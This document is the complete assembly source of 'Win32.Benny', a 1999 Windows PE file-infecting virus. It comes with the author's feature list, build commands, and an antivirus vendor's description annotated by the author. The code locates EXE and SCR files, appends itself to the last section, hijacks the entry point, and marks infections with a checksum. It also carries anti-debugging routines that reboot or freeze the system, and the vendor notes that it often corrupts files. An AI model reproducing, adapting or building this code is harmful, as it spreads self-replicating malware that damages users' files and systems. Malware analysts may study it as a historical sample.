;-------------------------------------;
;    Win32.Benny (c) 1999 by Benny    ;
;-------------------------------------;
;
;
;
;Author's description
;---------------------
;
;Welcome to my second Win32 virus! Don't expect any new things, I only
;present u my last lame virus. Here is it...
;
;Features:
;----------
;		-	Win32 infector
;		-	appends to the last section (usualy .reloc)
;		-	"already infected" mark as my spec. 64bit checksum.
;		-	no use of absolute addresses, gets GetModuleHandleA API from IAT
;		-	compressed (API strings only)
;		-	using memory mapped files for smarter handling of 'em
;		-	direct action
;		-	nonencrypted
;		-	armoured (using SEH), TD32 fails
;
;Targets:
;---------
;		-	*.EXE
;		-	*.SRC
;
;How to build:
;--------------
;		-	tasm32 -ml -q -m4 benny.asm
;			tlink32 -Tpe -c -x -aa -r benny,,, import32
;			pewrsec benny.exe
;
;
;
;AVP's description
;------------------
;
;Benny's notes r in "[* *]".
;
;
;This is a direct action (nonmemory resident) parasitic [* compressed *] Win32
;virus. It searches for PE EXE files in the Windows, Windows system and current
;directories [* shit! It DOESN'T infect Windows/System directories! *], then
;writes itself to the end of the file. The virus has bugs and in many cases
;corrupts files while infecting them [* Sorry, this is my last lame virus *].
;The virus checks file names and does not infect the files: RUNDLL32.EXE,
;TD32.EXE, TLINK32.EXE, TASM32.EXE [* and NTVDM.EXE *].  While infecting the
;virus increases the size of last file section, writes itself to there and
;modifies necessary PE header fields including program startup address. 
;
;The virus contains the "copyright" string: 
;
; Win32.Benny (c) 1999 by Benny
;
;
;
;And here is that promised babe:




.386p							;386 instructions
.model flat						;32bit offset, no segments

include PE.inc						;include some useful files
include MZ.inc
include Useful.inc
include Win32api.inc


nFile		=	1				;constants for decompress stage
nGet		=	2
nSet		=	3
nModule		=	4
nHandle		=	5
nCreate		=	6
nFind		=	7
nFirst		=	8
nNext		=	9
nClose		=	10
nViewOf		=	11
nDirectoryA	=	12
nEXE		=	13


extrn GetModuleHandleA:PROC				;APIs needed by first generation
extrn MessageBoxA:PROC
extrn ExitProcess:PROC


.data
	db	?					;shut up, tlink32 !
ends


.code
Start_Virus:
	pushad						;save all regs
	call gdelta

ve_strings:						;compressed APIs
	veszKernel32		db	'KERNEL32', 0
	veszGetModuleHandleA	db	nGet, nModule, nHandle, 'A', 0

	veszGetVersion		db	nGet, 'Version', 0
	veszIsDebuggerPresent	db	'IsDebuggerPresent', 0
	veszCreateFileA		db	nCreate, nFile, 'A', 0
	veszFindFirstFileA	db	nFind, nFirst, nFile, 'A', 0
	veszFindNextFileA	db	nFind, nNext, nFile, 'A', 0
	veszFindClose		db	nFind, nClose, 0
	veszSetFileAttributesA	db	nSet, nFile, 'AttributesA', 0
	veszCloseHandle		db	nClose, nHandle, 0
	veszCreateFileMappingA	db	nCreate, nFile, 'MappingA', 0
	veszMapViewOfFile	db	'Map', nViewOf, nFile, 0
	veszUnmapViewOfFile	db	'Unmap', nViewOf, nFile, 0
	veszSetFilePointer	db	nSet, nFile, 'Pointer', 0
	veszSetEndOfFile	db	nSet, 'EndOf', nFile, 0
	veszSetFileTime		db	nSet, nFile, 'Time', 0
	veszGetWindowsDirectoryA db	nGet, 'Windows', nDirectoryA, 0
	veszGetSystemDirectoryA	 db	nGet, 'System', nDirectoryA, 0
	veszGetCurrentDirectoryA db	nGet, 'Current', nDirectoryA, 0, 0

	veszExe			db	'*', nEXE, 0
	veszScr			db	'*.SCR', 0
	veszNames		db	'NTVDM', nEXE, 0		;files, which we wont
				db	'RUNDLL32', nEXE, 0		;infect
				db	'TD32', nEXE, 0
				db	'TLINK32', nEXE, 0
				db	'TASM32', nEXE, 0
	vszNumberOfNamez	=	5

	end_ve_stringz		db	0ffh				;end of compressed
									;strings
string_subs:						;string substitutes
	db	'File', 0
	db	'Get', 0
	db	'Set', 0
	db	'Module', 0
	db	'Handle', 0
	db	'Create', 0
	db	'Find', 0
	db	'First', 0
	db	'Next', 0
	db	'Close', 0
	db	'ViewOf', 0
	db	'DirectoryA', 0
	db	'.EXE', 0
num	=	14					;number of 'em

gdelta:							;get delta offset
	mov esi, [esp]
	mov ebp, esi
	sub ebp, offset ve_strings
	lea edi, [ebp + v_strings]

next_ch:lodsb						;decompressing stage
	test al, al
	je copy_b
	cmp al, 0ffh
	je end_unpacking
	cmp al, num+1
	jb packed
copy_b:	stosb
	jmp next_ch
packed:	push esi
	lea esi, [ebp + string_subs]
        mov cl, 1
 	mov dl, al
        lodsb
packed2:test al, al
	je _inc_
packed3:cmp cl, dl
	jne un_pck
p_cpy:	stosb
	lodsb
	test al, al
	jne p_cpy
	pop esi
	jmp next_ch
un_pck:	lodsb
	test al, al
	jne packed3
_inc_:	inc ecx
	jmp un_pck

seh_fn:	@SEH_RemoveFrame				;remove exception frame
	popad						;heal stack
	call [ebp + MyGetVersion]			;get version of windoze
	cmp eax, 80000000h				;WinNT ?
	jb NT_debug_trap
	cmp ax, 0a04h					;Win95 ?
	jb seh_rs

	call IsDebugger					;Win98, check, if debugger active
	jecxz seh_rs					;no, continue
	mov eax, 909119cdh				;yeah, reboot system
	jmp $ - 4

NT_debug_trap:
	call IsDebugger					;WinNT, check, if debugger active
	jecxz seh_rs					;no, continue
	xor esp, esp					;yeah, freeze app

IsDebugger:
	call [ebp + MyIsDebuggerPresent]		;call checkin API
	xchg eax, ecx
	ret

quit:	pop eax
	mov eax, [ebp + OrigEPoint]			;get original entrypoint rva
	sub eax, -400000h				;make it raw pointer
	mov [esp.Pushad_eax], eax
	popad
	jmp eax						;jump to host

end_unpacking:
	lea edx, [ebp + vszKernel32]			;KERNEL32
	push edx
	mov edx, [ebp + MyGetModuleHandleA]		;GetModuleHandleA API
	call [edx]					;get module of kernel32
	xchg eax, ecx
	jecxz quit					;shit, not found, jump to host
	xchg ecx, ebx

	lea edi, [ebp + Virus_End]			;get addresses of APIs
	lea esi, [ebp + f_names]
GetAPIAddress:
	call MyGetProcAddress
	jecxz quit
	xchg eax, ecx
	stosd
	@endsz
	cmp byte ptr [esi], 0
	jne GetAPIAddress

	pushad						;now, we have all APIs, we can check
	@SEH_SetupFrame 			;for debugger
	inc dword ptr gs:[edx]				;raise exception
							;now, we continue at seh_fn label

seh_rs:	lea esi, [ebp + PathName]			;debugger not present, continue
	push esi
	push esi
	push 256
	call [ebp + MyGetCurrentDirectoryA]		;get current directory
	pop ebx

	push 256
	lea edi, [ebp + WindowsPath]
	push edi
	call [ebp + MyGetWindowsDirectoryA]		;get windows directory

Next_Char:
	cmpsb						;compare directories
jmp_patch:
	jne NoMatch					;this jump will be path in next check
	jne Try_Process_Dir				;jump for next check fail
Matched_Char:
	cmp byte ptr [esi - 1], 0			;end of string ?
	jne Next_Char
	jmp quit

NoMatch:						;check for system directory
	push 256
	lea edi, [ebp + WindowsPath]
	push edi
	call [ebp + MyGetSystemDirectoryA]

	mov word ptr [ebp + jmp_patch], 9090h		;patch jump
	mov esi, ebx
	jmp Next_Char

Try_Process_Dir:
	call FindFirstFile			;we arnt in \windoze or \system dir, find file
	inc eax					;success ?
	je Try_Scr				;nope, try SCRs
	dec eax

process_dir_check:
	call CheckFileName			;check name
	jnc Infect_File				;ok, infect file

	call FindNextFile			;nope, find next file
	test eax, eax
	jne process_dir_check			;ok, check name

Try_Scr:
	call FindClose				;find previous searchin
	lea edx, [ebp + Win32_Find_Data]
	push edx
	lea edx, [ebp + vszScr]
	push edx
	call [ebp + MyFindFirstFileA]		;find first SCR
	inc eax
	je quit					;no files left, jump to host
	dec eax
	
Infect_File:
						;Check size
	xor ecx, ecx
	lea ebx, [ebp + Win32_Find_Data]
	test byte ptr [ebx], FILE_ATTRIBUTE_DIRECTORY
	jne end_size_check			;discard directories
	cmp [ebx.WFD_nFileSizeHigh], ecx	;discard huge files
	jne end_size_check
	mov edi, [ebx.WFD_nFileSizeLow]
	lea esi, [ebx.WFD_szFileName]
	cmp edi, 16 * 1024			;discard small files
	jb end_size_check
	cmp edi, 64000 * 1024
	jg end_size_check			;discard huge files
	
	push ecx				;blank file attributez
	push esi
	call [ebp + MySetFileAttributesA]
        test eax, eax
        je end_size_check

	push edi				;open and map file
	sub edi, Start_Virus - Virtual_End
	call Open&MapFile
        pop edi
	test ecx, ecx
        je end_SetFileAttributez

	cmp word ptr [ecx], 'ZM'		;Check PE-header
	jne Close&UnmapFile
	xchg eax, edx
	mov edx, [ecx.MZ_lfanew]
	cmp eax, edx
	jb CloseFile
	add edx, ecx
	cmp dword ptr [edx], 'EP'
	jne CloseFile
	movzx eax, word ptr [edx.NT_FileHeader.FH_Machine]
	cmp ax, 14ch				;must be 386+
	jne CloseFile

	mov ebx, ecx
	movzx ecx, word ptr [edx.NT_FileHeader.FH_NumberOfSections]
	cmp ecx, 3
	jb CloseFile				;at least 3 sections
	mov ax, word ptr [edx.NT_FileHeader.FH_Characteristics]
	not al
	test ax, 2002h				;executable, but not DLL
	jne CloseFile	
	cmp dword ptr [edx.NT_OptionalHeader.OH_ImageBase], 64*65536	;image base only 400000h
	jne CloseFile

	lea eax, [ebp + vszGetModuleHandleA]
	mov ecx, ebx
	lea edx, [ebp + vszKernel32]
	call GetProcAddressIT			;find GetModuleHandleA API entry
	test eax, eax
	je CloseFile
	lea edx, [ebp + MyGetModuleHandleA]
	sub eax, -400000h
	mov [edx], eax				;save that entry

	pushad					;load 64bit checksum
	push ebx
	mov esi, ebx
	sub esi, -MZ_res2
	lodsd
	mov ebx, eax
	lodsd
	mov edi, eax

	pop esi
	push esi
	push ebp

	mov eax, [ebp + Win32_Find_Data.WFD_nFileSizeLow]
	sub esi, -MZ_res2 - 8
	mov ebp, 8
	cdq
	div ebp
	cdq
	mul ebp

	pop ebp
	mov ecx, eax
	call Checksum64				;generate new 64bit checksum

	pop esi					;and compare checksums
	cmp ebx, edx
	jne n_Infect
	cmp edi, eax
	je CloseFile

n_Infect:
	popad
	push ecx
	push ecx
	mov edx, [ecx.MZ_lfanew]
	add edx, ecx

	movzx esi, word ptr [edx.NT_FileHeader.FH_SizeOfOptionalHeader]
	lea esi, [edx.NT_OptionalHeader + esi]	;locate first section
	movzx ecx, word ptr [edx.NT_FileHeader.FH_NumberOfSections]	;get number of sctnz
	mov edi, esi				;get LAST section
	xor eax, eax
	push ecx
BSection:
	cmp [edi.SH_PointerToRawData], eax
	je NBiggest
	mov ebx, ecx
	mov eax, [edi.SH_PointerToRawData]
NBiggest:
	sub edi, -IMAGE_SIZEOF_SECTION_HEADER
	loop BSection	
	pop ecx
	sub ecx, ebx

	push edx
	imul eax, ecx, IMAGE_SIZEOF_SECTION_HEADER
	pop edx
	add esi, eax

	mov edi, dword ptr [esi.SH_SizeOfRawData]
	mov eax, Virtual_End - Start_Virus
	push edi
	lea edi, [esi.SH_VirtualSize]			;new virtual size of section
	push dword ptr [edi]
	add [edi], eax
	mov eax, [edi]

	push edx
	mov ecx, [edx.NT_OptionalHeader.OH_FileAlignment]
	xor edx, edx
	div ecx
	xor edx, edx
	inc eax
	mul ecx
	mov [esi.SH_SizeOfRawData], eax		;new SizeOfRawData (aligned virtual size)
	mov ecx, eax
	pop edx

	pop ebx
	add ebx, [esi.SH_VirtualAddress]
	mov eax, [edx.NT_OptionalHeader.OH_AddressOfEntryPoint]
	pop edi
	push eax
	mov eax, [ebp + OrigEPoint]
	pop [ebp + OrigEPoint]
	mov [edx.NT_OptionalHeader.OH_AddressOfEntryPoint], ebx
	sub ecx, edi
	add [edx.NT_OptionalHeader.OH_SizeOfImage], ecx		;new SizeOfImage
	or byte ptr [esi.SH_Characteristics.hiw.hib], 0e0h	;change flags

	pop edi
	add edi, [esi.SH_PointerToRawData]
	add edi, [esi.SH_VirtualSize]
	add edi, Start_Virus - Virtual_End 
	lea esi, [ebp + Start_Virus]
	mov ecx, (Virus_End - Start_Virus + 3) / 4
	rep movsd						;copy virus
	mov [ebp + OrigEPoint], eax		;restore variable after copy stage
	jmp CloseFileOK

CloseFile:
	call Close&UnmapFile			;unmap view of file
	jmp end_SetFileAttributez		;and restore attributes
	
CloseFileOK:
	pop esi
	push esi
	push ebx
	push ebp

	mov ebp, 8
	mov ebx, MZ_res2 + 8
	add esi, ebx
	mov ecx, ebp
	mov eax, edi
	add eax, ebx
	sub eax, esi
	cdq
	div ecx
	cdq
	imul ecx, eax, 8
	call Checksum64		;generate new 64bit checksum as "already infected" mark
	sub esi, ebp
	mov [esi], edx		;store it to MZ.MZ_res2 field
	mov [esi+4], eax

	pop ebp
	pop ebx
	pop esi
	sub edi, esi
	mov [ebp + Win32_Find_Data.WFD_nFileSizeLow], edi	;correct file size for unmapping
	call Close&UnmapFile		;unmap view of file

end_SetFileAttributez:
	push dword ptr [ebp + Win32_Find_Data]		;restore attributes
	push esi
	call [ebp + MySetFileAttributesA]

end_size_check:
	call FindNextFile				;find next file
	test eax, eax
	jne next_file					;weve got one, check that
	call FindClose					;nope, close search handle
	jmp quit					;and jump to host

next_file:
	call CheckFileName				;check file name
	jnc Infect_File					;ok, infect it
	jmp end_size_check				;nope, try next file


CheckFileName proc					;check file name
	lea edi, [ebp + Win32_Find_Data.WFD_szFileName]
	lea esi, [ebp + vszNamez]
	mov ecx, vszNumberOfNamez
	mov edx, edi
Ext_Next_Char:
        @endsz
	mov edi, edx
Ext_Next_Char2:
	cmpsb
	je Ext_Matched_Char
	inc eax
	loop Ext_Next_Char
	clc
	ret
Ext_Matched_Char:
	cmp byte ptr [esi - 1], 0
	jne Ext_Next_Char2
	stc
end_Ext_Checking:
	ret
CheckFileName EndP


FindFirstFile proc					;find first file procedure
	lea edx, [ebp + Win32_Find_Data]
	push edx
	lea edx, [ebp + vszExe]
	push edx
	call [ebp + MyFindFirstFileA]
	mov [ebp + SearchHandle], eax
	ret
FindFirstFile EndP

FindNextFile proc					;find next file procedure
	lea edx, [ebp + Win32_Find_Data]
	push edx
        push dword ptr [ebp + SearchHandle]
	call [ebp + MyFindNextFileA]
	ret
FindNextFile EndP

FindClose proc						;find close procedure
        push dword ptr [ebp + SearchHandle]
	call [ebp + MyFindClose]
	ret
FindClose EndP



Open&MapFile proc					;open and map file procedure
	xor eax, eax
	push eax	;NULL
	push eax	;FILE_ATTRIBUTE_NORMAL
	push 3		;OPEN_EXISTING
	push eax	;NULL
	push 1		;FILE_SHARE_READ
	push 0c0000000h	;GENERIC_READ | GENERIC_WRITE
	push esi	;pszFileName
	call [ebp + MyCreateFileA]	;open
	cdq
	inc eax
	je end_Open&MapFile
	dec eax
	mov [ebp + hFile], eax

	push edx	;NULL
	push edi	;file size
	push edx	;0
	push 4		;PAGE_READWRITE
	push edx	;NULL
	push eax	;handle
	call [ebp + MyCreateFileMappingA]	;create mapping object
	cdq
	xchg ecx, eax
	jecxz end_Open&MapFile2
	mov [ebp + hMapFile], ecx

	push edx	;0
	push edx	;0
	push edx	;0
	push 2		;FILE_MAP_WRITE
	push ecx	;handle
	call [ebp + MyMapViewOfFile]		;map file to address space of app
	mov ecx, eax
	jecxz end_Open&MapFile3
	mov [ebp + lpFile], ecx

end_Open&MapFile:
	mov ecx, eax
	ret
Open&MapFile EndP


Close&UnmapFile proc					;close and unmap file procedure
	push dword ptr [ebp + lpFile]
	call [ebp + MyUnmapViewOfFile]			;unmap file

end_Open&MapFile3:
	push dword ptr [ebp + hMapFile]
	call [ebp + MyCloseHandle]			;close mapping object

end_Open&MapFile2:	
	mov ebx, [ebp + hFile]

	cdq		;xor edx, edx
	push edx	;FILE_BEGIN
	push edx	;0   - high offset
	push dword ptr [ebp + Win32_Find_Data.WFD_nFileSizeLow]
	push ebx
	call [ebp + MySetFilePointer]

	push ebx
	call [ebp + MySetEndOfFile]			;truncate file

	lea edx, [ebp + Win32_Find_Data.WFD_ftLastWriteTime]
	push edx
	lea edx, [ebp + Win32_Find_Data.WFD_ftLastAccessTime]
	push edx
	lea edx, [ebp + Win32_Find_Data.WFD_ftCreationTime]
	push edx
	push ebx
	call [ebp + MySetFileTime]			;restore time

	push ebx
	call [ebp + MyCloseHandle]			;and finally close file
	ret
Close&UnmapFile EndP



;procedure for exploring modules export table
MyGetProcAddress proc	;input:
				;ebx - module address
				;esi - pointer to API name
			;output:
				;ecx - address of GetProcAddress at memory
	push ebx
	push edi
	push esi
	push ebp
	@SEH_SetupFrame 
	mov eax, ebx
	add eax, [eax.MZ_lfanew]
	mov ecx, [eax.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_Size]
	jecxz Proc_Address_not_found
	mov ebp, ebx
	add ebp, [eax.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]

	push ecx
	mov edx, ebx
	add edx, [ebp.ED_AddressOfNames]
	mov ecx, [ebp.ED_NumberOfNames]
	xor eax, eax
	
Search_for_API_name:

	mov edi, [esp + 16]
	mov esi, ebx
	add esi, [edx + eax * 4]
	
Next_Char_in_API_name:
        cmpsb
	jz Matched_char_in_API_name
	inc eax
	loop Search_for_API_name
	pop eax

Proc_Address_not_found:
	xor eax, eax
	jmp End_MyGetProcAddress

Matched_char_in_API_name:
	cmp byte ptr [esi-1], 0
	jne Next_Char_in_API_name
	pop ecx
	mov edx, ebx
	add edx, [ebp.ED_AddressOfOrdinals]
	movzx eax, word ptr [edx + eax * 2]

Check_Index:
	cmp eax, [ebp.ED_NumberOfFunctions]
	jae Proc_Address_not_found
	mov edx, ebx
	add edx, [ebp.ED_AddressOfFunctions]
	add ebx, [edx + eax * 4]
	mov eax, ebx
	sub ebx, ebp
	cmp ebx, ecx
	jb Proc_Address_not_found

End_MyGetProcAddress:
        @SEH_RemoveFrame
	xchg eax, ecx
	pop ebp
	pop esi
	pop edi
	pop ebx
	ret
MyGetProcAddress endp


;all beginners=> im so sorry, but I didnt have any time to comment this stuff.
GetProcAddressIT proc	;input:
				;EAX - API name
				;ECX - lptr to PE header
				;EDX - module name
			;output:
				;EAX - RVA pointer to IAT, 0 if error
	pushad
	xor eax, eax
	push ebp
	mov ebp, ecx
	lea esi, [ecx.MZ_lfanew]
	add ebp, [esi]
	mov esi, ebp
	;RVA of Import table
	mov eax, [esi.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_VirtualAddress]
	mov ebp, ecx
	
	push ecx
	movzx ecx, word ptr [esi.NT_FileHeader.FH_NumberOfSections]
	movzx ebx, word ptr [esi.NT_FileHeader.FH_SizeOfOptionalHeader]
	lea ebx, [esi.NT_OptionalHeader + ebx]

scan_sections:
	mov edx, [ebx.SH_VirtualAddress]
	cmp edx, eax
	je section_found
	sub ebx, -IMAGE_SIZEOF_SECTION_HEADER
	loop scan_sections
	pop ecx
	pop eax
	jmp End_GetProcAddressIT2

section_found:
	mov ebx, [ebx + 20]
	add ebx, ebp
	pop ecx
	pop eax
	test ebx, ebx
	je End_GetProcAddressIT2
	
	xor esi, esi
	xor ebp, ebp
	push esi
	dec ebp
Get_DLL_Name:
	pop esi
	inc ebp
	mov edi, [esp + 20]
	mov ecx, [ebx.esi.ID_Name]		;Name RVA

	test ecx, ecx
	je End_GetProcAddressIT2
	sub ecx, edx
	sub esi, -IMAGE_SIZEOF_IMPORT_DESCRIPTOR
	push esi
	lea esi, [ebx + ecx]

Next_Char_from_DLL:
	lodsb
	add al, -'.'	
	jz IT_nup
	sub al, -'.' + 'a'
        cmp al, 'z' - 'a' + 1
	jae no_up
	add al, -20h
no_up:	sub al, -'a'
IT_nup:	scasb
	jne Get_DLL_Name
	cmp byte ptr [edi-1], 0
	jne Next_Char_from_DLL

Found_DLL_Name:
	pop esi	
	imul eax, ebp, IMAGE_SIZEOF_IMPORT_DESCRIPTOR
	mov ecx, [ebx + eax.ID_OriginalFirstThunk]
	jecxz End_GetProcAddressIT2
	sub ecx, edx
	add ecx, ebx
	
	xor esi, esi
Next_Imported_Name:
	push esi
	mov edi, [esp + 32]
	mov esi, [ecx + esi]
	test esi, esi
	je End_GetProcAddressIT3
	sub esi, edx
	add esi, ebx
	lodsw
next_char:
	cmpsb
	jne next_step
	cmp byte ptr [esi-1], 0
	je got_it
	jmp next_char
next_step:
	pop esi
	sub esi, -4
	jmp Next_Imported_Name

got_it:	pop esi
	imul ebp, IMAGE_SIZEOF_IMPORT_DESCRIPTOR
	add ebx, ebp
	mov eax, [ebx.ID_FirstThunk]
	add eax, esi

	mov [esp + 28], eax
	jmp End_GetProcAddressIT

End_GetProcAddressIT3:
	pop eax
End_GetProcAddressIT2:
	xor eax, eax
	mov [esp.Pushad_eax], eax
End_GetProcAddressIT:
	popad
	ret
GetProcAddressIT EndP


Checksum64 proc			;output:
				;	EDX:EAX	-	64-bit checksum

	push ebx					;save regs
	push ecx
	push edi
	push esi
	xor eax, eax					;nulify eax
	cdq						;nulify edx
make_crc:
	call crc_byte					;read 8 bytes
	adc eax, ebx					;add LSD + CF to LSD
	jnc @1
	not eax						;invert LSD
@1:	xor eax, edx					;rotate LSD LSB times
	jp @2
	call crc_rotate					;rotate LSD and MSD
@2:	js crc_msd
	sbb eax, edx					;sub LSD with MSD + CF
crc_msd:sbb edx, edi					;sub MSD with MSD + CF
	jnp @3
	not edx						;invert MSD
@3:	xor edx, eax					;xor MSD with LSD
	jns @4
	call crc_rotate					;rotate LSD and MSD
@4:	jc crc_loop
	adc edx, eax					;add LSD to MSD + CF
crc_loop:
	jp next_loop
	call crc_swap					;swap bytes in LSD and MSD
next_loop:
	dec eax						;decrement LSD
	inc edx						;increment MSD
	loop make_crc					;until ecx = 1
	pop esi						;restore regs
	pop edi
	pop ecx
	pop ebx
	ret

crc_byte:						;read 8 bytes from source
	push eax
	lodsd						;load 4 bytes
	mov ebx, eax					;ebx = new 4 bytes
	lodsd						;load next 4 bytes
	mov edi, eax					;edi = new 4 bytes
	pop eax
	add ecx, -7					;correct ecx for loop
	ret
crc_rotate:						;rotate LSD and MSD
	push ecx
	push edi
	xor edi, eax					;xor MSD with LSD
	mov ecx, edi					;count of rotations
	pop edi
	rcr eax, cl					;rotate LSD
	push ebx
	xor ebx, edx					;xor LSD with MSD
	mov ecx, ebx					;count of rotations
	pop ebx
	rcl edx, cl					;rotate MSD
	pop ecx
	ret
crc_swap:						;swap bytes in LSD and MSD
	xchg al, dh					;swap LSD and MSD lower bytes
	xchg ah, dl					;	...
	rol eax, 16					;get highest bytes
	rol edx, 16					;	...
	xchg al, dh					;swap LSD and MSD higher bytes
	xchg ah, dl					;	...
	xchg eax, edx					;and swap LSD with MSD
	ret
	db	'Win32.Benny (c) 1999 by Benny', 0	;my mark
Checksum64 EndP


OrigEPoint		dd	offset host - 400000h
MyGetModuleHandleA	dd	offset _GetModuleHandleA

Virus_End:
	MyGetVersion		dd	?
	MyIsDebuggerPresent	dd	?
	MyCreateFileA		dd	?
	MyFindFirstFileA	dd	?
	MyFindNextFileA		dd	?
	MyFindClose		dd	?
	MySetFileAttributesA	dd	?
	MyCloseHandle		dd	?
	MyCreateFileMappingA	dd	?
	MyMapViewOfFile		dd	?
	MyUnmapViewOfFile	dd	?
	MySetFilePointer	dd	?
	MySetEndOfFile		dd	?
	MySetFileTime		dd	?
	MyGetWindowsDirectoryA	dd	?
	MyGetSystemDirectoryA	dd	?
	MyGetCurrentDirectoryA	dd	?

v_strings:
	vszKernel32		db	'KERNEL32', 0
	vszGetModuleHandleA	db	'GetModuleHandleA', 0
f_names:
	vszGetVersion		db	'GetVersion', 0
	vszIsDebuggerPresent	db	'IsDebuggerPresent', 0
	vszCreateFileA		db	'CreateFileA', 0
	vszFindFirstFileA	db	'FindFirstFileA', 0
	vszFindNextFileA	db	'FindNextFileA', 0
	vszFindClose		db	'FindClose', 0
	vszSetFileAttributesA	db	'SetFileAttributesA', 0
	vszCloseHandle		db	'CloseHandle', 0
	vszCreateFileMappingA	db	'CreateFileMappingA', 0
	vszMapViewOfFile	db	'MapViewOfFile', 0
	vszUnmapViewOfFile	db	'UnmapViewOfFile', 0
	vszSetFilePointer	db	'SetFilePointer', 0
	vszSetEndOfFile		db	'SetEndOfFile', 0
	vszSetFileTime		db	'SetFileTime', 0
	vszGetWindowsDirectoryA	db	'GetWindowsDirectoryA', 0
	vszGetSystemDirectoryA	db	'GetSystemDirectoryA', 0
	vszGetCurrentDirectoryA	db	'GetCurrentDirectoryA', 0, 0

	vszExe			db	'*.EXE', 0
	vszScr			db	'*.SCR', 0
	vszNamez		db	'NTVDM.EXE', 0
				db	'RUNDLL32.EXE', 0
				db	'TD32.EXE', 0
				db	'TLINK32.EXE', 0
				db	'TASM32.EXE', 0

	PathName		db	256 dup (?)
	WindowsPath		db	256 dup (?)
	Win32_Find_Data		WIN32_FIND_DATA	?
	SearchHandle		dd	?
	hFile			dd	?
	hMapFile		dd	?
	lpFile			dd	?

Virtual_End:
_GetModuleHandleA		dd	offset GetModuleHandleA


host:	push 1000h
	push offset Msg
	push offset Msg
	push 0
	call MessageBoxA
exit_h:	push 0
	call ExitProcess

Msg	db	'First generation of Win32.Benny', 0

ends
End Start_Virus





